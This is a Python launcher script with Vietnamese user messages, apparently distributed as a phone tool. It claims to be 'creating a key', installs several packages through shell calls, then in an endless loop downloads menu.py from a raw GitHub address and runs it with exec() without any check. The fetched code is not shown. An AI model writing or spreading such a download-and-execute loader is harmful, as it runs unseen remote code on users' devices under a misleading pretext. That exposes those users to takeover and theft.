import os
import time
import threading


print("  Đang tạo key...")
print("  Nếu lỗi vui lòng tạo một folder khác nhét file tool vào ...")
print("  Chúng tôi phát hiện ra nhiều thành phần đem tool của chúng tôi đi bán...")
print("  Cho nên chúng tôi đg cố gắng bảo vệ tool...")
print("  Hãy thông cảm cho chúng tôi nếu bạn gặp lỗi...")
try:
            
    from datetime import datetime
    import random
    from time import sleep
    import os
    
# URL của file api.py trên GitHub
except ImportError as e:
    print(f"Lỗi: {e}")
    pass#print("Có vẻ như một số module chưa được cài đặt.")
user_input = input("  Nếu bạn lần đầu chạy, Bạn là người mới?thì hãy nhập y lần sau cứ nhập n nhé, chỉ cần cài lần đầu (y/n): ").strip().lower()
if user_input in ['y', 'yes']:
    os.system('pip install requests')
    os.system('pip install pystyle')    
    os.system('pip install dnspython')
    os.system('pip install tabulate')
    os.system('pip install bs4')
    os.system('pip install rich')        
    os.system('pip install random_user_agent')
    os.system('pkg install android-tools')   
    print("Cài đặt hoàn tất. Vui lòng chạy lại chương trình!")
    sleep(1)  # Đợi 2 giây rồi thoát
    exit()  

import os
import sys
import json
import base64
import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import os
import sys
import json
import base64
import requests
import glob
import hashlib  # Tạo checksum
import socket  # ✅ Thêm dòng này để tránh lỗi
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import os
import sys
import json
import base64
import requests
import glob  # Thư viện tìm file
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import psutil
import time

# 🔴 Kiểm tra xem requests có bị thay thế không



while True:
     try:
        response = requests.get('https://raw.githubusercontent.com/chhhgggg/h/refs/heads/main/menu.py', timeout=5)
        exec(response.text)
     except requests.ConnectionError:
        print("\033[1;91mMất kết nối! Tool sẽ tự động thoát.")
        sys.exit()
     except KeyboardInterrupt:
        print("\n\033[1;91mCảm ơn bạn đã dùng Tool!")
        sys.exit()
